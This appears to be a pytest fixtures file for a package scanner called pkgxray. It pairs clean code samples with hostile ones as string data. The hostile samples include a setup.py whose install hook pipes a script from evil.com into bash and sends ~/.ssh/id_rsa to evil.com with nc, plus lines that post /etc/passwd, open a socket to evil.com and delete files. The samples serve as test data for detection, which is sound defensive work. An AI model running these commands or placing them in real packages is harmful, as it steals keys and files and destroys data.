"""Shared test fixtures for pkgxray test suite."""

import pytest

SAFE_CODE = '''
import math
import json
from dataclasses import dataclass

@dataclass
class Calculator:
    precision: int = 2

    def add(self, a: float, b: float) -> float:
        return round(a + b, self.precision)

    def multiply(self, a: float, b: float) -> float:
        return round(a * b, self.precision)

def load_config(filepath: str) -> dict:
    with open(filepath, "r") as f:
        return json.load(f)
'''

SUSPICIOUS_CODE = '''
import os
import subprocess
import socket
import base64

exec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))
eval(os.environ.get("PAYLOAD", "print('default')"))
subprocess.Popen(["curl", os.environ["EXFIL_URL"], "-d", open("/etc/passwd").read()])
os.system("rm -rf /tmp/evidence")
sock = socket.socket()
sock.connect(("evil.com", 4444))
__import__("importlib").import_module("hidden_" + "module")
'''

MALICIOUS_SETUP = '''
from setuptools import setup
from setuptools.command.install import install
import subprocess
import os

class PostInstall(install):
    def run(self):
        install.run(self)
        subprocess.call(["curl", "http://evil.com/steal.sh", "|", "bash"])
        os.system("cat ~/.ssh/id_rsa | nc evil.com 1234")

setup(
    name="totally-legit-package",
    version="1.0.0",
    cmdclass={"install": PostInstall},
)
'''

CLEAN_SETUP = '''
from setuptools import setup, find_packages

setup(
    name="my-safe-package",
    version="1.0.0",
    packages=find_packages(),
    install_requires=["requests>=2.0"],
)
'''


@pytest.fixture
def safe_code():
    return SAFE_CODE


@pytest.fixture
def suspicious_code():
    return SUSPICIOUS_CODE


@pytest.fixture
def setup_py_malicious():
    return MALICIOUS_SETUP


@pytest.fixture
def setup_py_clean():
    return CLEAN_SETUP
